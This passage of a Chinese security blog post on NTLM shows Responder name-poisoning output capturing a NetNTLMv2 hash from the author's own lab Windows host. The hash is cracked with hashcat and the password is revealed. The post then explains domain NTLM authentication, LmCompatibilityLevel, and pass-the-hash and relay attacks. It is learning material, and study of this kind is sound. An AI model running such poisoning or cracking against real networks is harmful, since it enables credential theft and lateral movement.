<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span> <span class="token punctuation">(</span>service: File Server<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Client   <span class="token builtin class-name">:</span> fe80::4029:1fd8:cf61:59c2
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Username <span class="token builtin class-name">:</span> WIN-N5633OS4LCV<span class="token punctuation">\</span>test
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Hash     <span class="token builtin class-name">:</span> test::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964EF5F83B204EE0B30077A88052F:01010000000000008043172396A3DA0106380B005DCDDA4D00000000020008004E004E004C004E0001001E00570049004E002D004A004E004F00510042005A003100440036004B00390004003400570049004E002D004A004E004F00510042005A003100440036004B0039002E004E004E004C004E002E004C004F00430041004C00030014004E004E004C004E002E004C004F00430041004C00050014004E004E004C004E002E004C004F00430041004C00070008008043172396A3DA0106000400020000000800300030000000000000000000000000200000CC6D994464DFABE76848136D66BF3068E7689FA0E037ECFFB9164FE9EECBE5B20A001000000000000000000000000000000000000900100063006900660073002F003100310031000000000000000000                                                                               
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Skipping previously captured <span class="token builtin class-name">hash</span> <span class="token keyword">for</span> WIN-N5633OS4LCV<span class="token punctuation">\</span>test
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Skipping previously captured <span class="token builtin class-name">hash</span> <span class="token keyword">for</span> WIN-N5633OS4LCV<span class="token punctuation">\</span>test
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name WORKGROUP <span class="token punctuation">(</span>service: Browser Election<span class="token punctuation">)</span></code></pre>
<p><strong>test::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964EF5F83B204EE0B30077A88052F:01010000000000008043172396A3DA0106380B005DCDDA4D00000000020008004E004E004C004E0001001E00570049004E002D004A004E004F00510042005A003100440036004B00390004003400570049004E002D004A004E004F00510042005A003100440036004B0039002E004E004E004C004E002E004C004F00430041004C00030014004E004E004C004E002E004C004F00430041004C00050014004E004E004C004E002E004C004F00430041004C00070008008043172396A3DA0106000400020000000800300030000000000000000000000000200000CC6D994464DFABE76848136D66BF3068E7689FA0E037ECFFB9164FE9EECBE5B20A001000000000000000000000000000000000000900100063006900660073002F003100310031000000000000000000</strong><br>这个就是NTLM v2 Hash值<br>尝试用hashcat爆破一下，先把hash值保存在b.txt</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># hashcat b.txt /usr/share/wordlists/rockyou.txt --force -m 5600       </span>
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting

You have enabled <span class="token parameter variable">--force</span> to bypass dangerous warnings and errors<span class="token operator">!</span>
This can hide serious problems and should only be <span class="token keyword">done</span> when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API <span class="token punctuation">(</span>OpenCL <span class="token number">3.0</span> PoCL <span class="token number">5.0</span>+debian  Linux, None+Asserts, RELOC, SPIR, LLVM <span class="token number">16.0</span>.6, SLEEF, DISTRO, POCL_DEBUG<span class="token punctuation">)</span> - Platform <span class="token comment">#1 [The pocl project]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
* Device <span class="token comment">#1: cpu-haswell-12th Gen Intel(R) Core(TM) i7-12700H, 1142/2349 MB (512 MB allocatable), 1MCU</span>

Minimum password length supported by kernel: <span class="token number">0</span>
Maximum password length supported by kernel: <span class="token number">256</span>

Hashes: <span class="token number">1</span> digests<span class="token punctuation">;</span> <span class="token number">1</span> unique digests, <span class="token number">1</span> unique salts
Bitmaps: <span class="token number">16</span> bits, <span class="token number">65536</span> entries, 0x0000ffff mask, <span class="token number">262144</span> bytes, <span class="token number">5</span>/13 rotates
Rules: <span class="token number">1</span>

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION<span class="token operator">!</span> Pure <span class="token punctuation">(</span>unoptimized<span class="token punctuation">)</span> backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append <span class="token parameter variable">-O</span> to your commandline.
See the above message to <span class="token function">find</span> out about the exact limits.

Watchdog: Temperature abort trigger <span class="token builtin class-name">set</span> to 90c

Host memory required <span class="token keyword">for</span> this attack: <span class="token number">0</span> MB

Dictionary cache built:
* Filename<span class="token punctuation">..</span>: /usr/share/wordlists/rockyou.txt
* Passwords.: <span class="token number">14344393</span>
* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921511</span>
* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344386</span>
* Runtime<span class="token punctuation">..</span>.: <span class="token number">0</span> secs

TEST::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964ef5f83b204ee0b30077a88052f:01010000000000008043172396a3da0106380b005dcdda4d00000000020008004e004e004c004e0001001e00570049004e002d004a004e004f00510042005a003100440036004b00390004003400570049004e002d004a004e004f00510042005a003100440036004b0039002e004e004e004c004e002e004c004f00430041004c00030014004e004e004c004e002e004c004f00430041004c00050014004e004e004c004e002e004c004f00430041004c00070008008043172396a3da0106000400020000000800300030000000000000000000000000200000cc6d994464dfabe76848136d66bf3068e7689fa0e037ecffb9164fe9eecbe5b20a001000000000000000000000000000000000000900100063006900660073002f003100310031000000000000000000:qweasd
                                                          
Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">5600</span> <span class="token punctuation">(</span>NetNTLMv2<span class="token punctuation">)</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: TEST::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964ef5f83<span class="token punctuation">..</span>.000000
Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat May <span class="token number">11</span> <span class="token number">11</span>:33:30 <span class="token number">2024</span>, <span class="token punctuation">(</span><span class="token number">1</span> sec<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Sat May <span class="token number">11</span> <span class="token number">11</span>:33:31 <span class="token number">2024</span>, <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/usr/share/wordlists/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Speed.<span class="token comment">#1.........:   525.0 kH/s (0.35ms) @ Accel:256 Loops:1 Thr:1 Vec:8</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">3072</span>/14344386 <span class="token punctuation">(</span><span class="token number">0.02</span>%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/3072 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">2816</span>/14344386 <span class="token punctuation">(</span><span class="token number">0.02</span>%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment">#1....: pirate -> dangerous</span>
Hardware.Mon.<span class="token comment">#1..: Util: 57%</span>

Started: Sat May <span class="token number">11</span> <span class="token number">11</span>:33:29 <span class="token number">2024</span>
Stopped: Sat May <span class="token number">11</span> <span class="token number">11</span>:33:31 <span class="token number">2024</span></code></pre>
<p>其中-m 5600  指定是NTLM v2模式，结果可以看出爆破成功，–show一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># hashcat b.txt /usr/share/wordlists/rockyou.txt --force -m 5600 --show</span>
TEST::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964ef5f83b204ee0b30077a88052f:01010000000000008043172396a3da0106380b005dcdda4d00000000020008004e004e004c004e0001001e00570049004e002d004a004e004f00510042005a003100440036004b00390004003400570049004e002d004a004e004f00510042005a003100440036004b0039002e004e004e004c004e002e004c004f00430041004c00030014004e004e004c004e002e004c004f00430041004c00050014004e004e004c004e002e004c004f00430041004c00070008008043172396a3da0106000400020000000800300030000000000000000000000000200000cc6d994464dfabe76848136d66bf3068e7689fa0e037ecffb9164fe9eecbe5b20a001000000000000000000000000000000000000900100063006900660073002f003100310031000000000000000000:qweasd</code></pre>
<p><code>qweasd</code>就是我设置win10的密码</p>
<h1 id="域环境下的NTLM-认证"><a href="#域环境下的NTLM-认证" class="headerlink" title="域环境下的NTLM 认证"></a>域环境下的NTLM 认证</h1><p><img src="https://ooo.0x0.ooo/2024/05/11/OJBIdS.png" alt="OJBIdS.png" loading="lazy"></p>
<ol>
<li>客户端想要访问服务器的某个服务，需要进行身份认证。于是，在输人服务器的用户名和密码进行验证之后，客户端会缓存服务器密码的<strong>NTLM Hash</strong>值。然后，客户端会向服务端发送一个请求，该请求利用<strong>NTLM SSP</strong>生成<strong>NTLMSSP_NEGOTIATE</strong>消息(Type1)。</li>
<li>服务端接收到客户端发送过来的Type1消息，会读取其中的内容，并从中选择自己所能接受的服务内容、加密等级、安全服务等。然后传人NTLM SSP,得到<strong>NTLMSSP_CHALLENGE</strong>消息(Type2)，并将此Type2消息发回给客户端。在此Typc2消息中包含一个由服务端生成的16位随机值，被称为<strong>Challenge</strong>值，服务端将该<strong>Challenge</strong>值缓存起来。</li>
<li>客户端收到服务端返回的Iype2消息后，读取服务端所支持的内容，并取出其中的<strong>Challenge</strong>值，用缓存的服务器密码的NTLM Hash对其进行加密得到<strong>Response</strong>消息，<strong>Response</strong>消息中可以提取出<strong>Net-NTLM Hash</strong>。最后将Response和一些其他信息封装到<strong>NTLMSSP_AUTH</strong>消息中(Type3)，发往服务端。<br>以上过程与工作组下NTLM协议认证机制一样，以下过程与域控(DC)有关</li>
<li>服务端接收到客户端发送来的<strong>NTLMSSP_AUTH</strong>认证消息后，通过<strong>Netlogon协议</strong>与域控制器(Domain Controller,DC,简称域控)建立一个安全通道，将验证消息发给域控。</li>
<li>域控收到服务端发来的验证消息后，从中取出<strong>Net-NTLM Hash</strong>。然后从<strong>数据库</strong>中找到该用户的<strong>NTLM Hash</strong>,对<strong>Challenge</strong>进行一系列加密运算，得到自己计算的<strong>Net-NTLMHash</strong>,比较自已计算出的<strong>Net-NTLM Hash</strong>和服务端发送的<strong>Net-NTLM Hash</strong>是否相等，如果相等，则证明客户端输人的密码正确，认证成功，反之认证失败，域控将验证结果发给服务端。</li>
<li>服务端根据域控返回的结果，对客户端进行回复。</li>
</ol>
<p>其实，域环境下的NTLM协议认证与工作组下没有什么区别，就是在<strong>Response</strong>的认证过程由域控承担。<br>这个实验先不做(其实是我的环境还没搭建好)</p>
<h1 id="NTLM-v1和NTLM-v2的区别"><a href="#NTLM-v1和NTLM-v2的区别" class="headerlink" title="NTLM v1和NTLM v2的区别"></a>NTLM v1和NTLM v2的区别</h1><p>前面说过，NTLM v1和NTLM v2最大的区别就是<code>Challenge</code>值与加密算法的不同。</p>
<ol>
<li>Challenge值<br>NTLM v1: 8B<br>NTLM v2：16B</li>
<li>加密算法<br> NTLM v1: DES加密算法<br> NTLM v2: HMAC-MD5加密算法</li>
<li>Net-NTLM v1的Hash格式<br>username:hostname:LM response:NTLM response:challenge</li>
</ol>
<h1 id="LmCompatibilityLevel"><a href="#LmCompatibilityLevel" class="headerlink" title="LmCompatibilityLevel"></a>LmCompatibilityLevel</h1><p><strong>LmCompatibilityLevel</strong>的值用来确定网络登录使用的Challenge&#x2F;Response身份验证协议。<br>LmCompatibilityLevel值对应的含义<br>0: 客户端使用LM和NTLM身份验证，但从不使用NTLM v2会话安全性。域控接受LM、NTLM和NTLM v2身份验证。<br>1: 客户端使用LM和NTLM身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控接受LM、NTLM和NTLM v2身份验证。<br>2: 客户端使用NTLM身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控接受LM、NTLM和NTLM v2身份验证。<br>3: 客户端仅使用NTLM v2身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控接受LM、NTLM和NTLM v2身份验证。<br>4: 客户端仅使用NTLM v2身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控拒绝LM身份验证，但接受NTLM和NTLM v2身份验证。<br>5: 客户端仅使用NTLM v2身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控拒绝LM和NTLM身份验证，但接受NTLM v2身份验证。</p>
<p>在本地可以修改<strong>LmCompatibilityLevel</strong>的值<br><img src="https://ooo.0x0.ooo/2024/05/11/OJBIdS.png" alt="OJBIdS.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/05/11/OJU2BK.png" alt="OJU2BK.png" loading="lazy"><br>默认是没有值的，可以自行修改。</p>
<h1 id="NTLM协议的安全问题"><a href="#NTLM协议的安全问题" class="headerlink" title="NTLM协议的安全问题"></a>NTLM协议的安全问题</h1><p>上面说过Type3 <code>NTLMSSP_AUTH</code>是使用用户密码进行计算的。因此，当没有拿到用户密码明文只拿到hash的时候可以进行<code>PTH</code>(Pass The Hash)(哈希传递)攻击。同样，在Response中存在<code>Net-NTLM Hash</code>，当获取到<code>Net-NTLM Hash</code>，可以进行中间人攻击，重放<code>Net-NTLM Hash</code>，这种就是NTLM Relay(NTLM 中继)攻击。由于NTLM v1协议加密过程存在天然缺陷，因此可以对Net-NTLM Hash进行破解，得到NTLM Hash后就可以横向。</p>
<ol>
<li><strong>Pass The Hash</strong><br>Pass The Hash是内网横向攻击的一种方式。当获取到用户密码的NTLM Hash，对内网其他用户进行Hash碰撞，碰撞到使用相同密码的机器。然后通过135或445端口横向移动到使用该密码的机器。</li>
<li><strong>NTLM Relay</strong><br>上面使用<code>Responder</code>获取<code>Net-NTLM Hash</code>就是一种NTLM中继攻击，</li>
<li><strong>Net-NTLM v1 Hash破解</strong><br>只要获取到<code>Net-NTLM v1 Hash</code>就能破解为<code>NTLM Hash</code>，这与密码强度无关。在域环境，可以直接使用NTLM Hash连接。</li>
</ol>
<p>NTLM协议暂且学到这。后续还会进行不同类型的攻击实验。</p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/b774aeb/" title="NTLM协议">http://ta0.fun/posts/b774aeb/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/2d21762d/" rel="prev" title="Kerberos协议"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Kerberos协议</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/16d10af0/" rel="next" title="HackMyVM-Casino"><span class="post-nav-text">HackMyVM-Casino</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>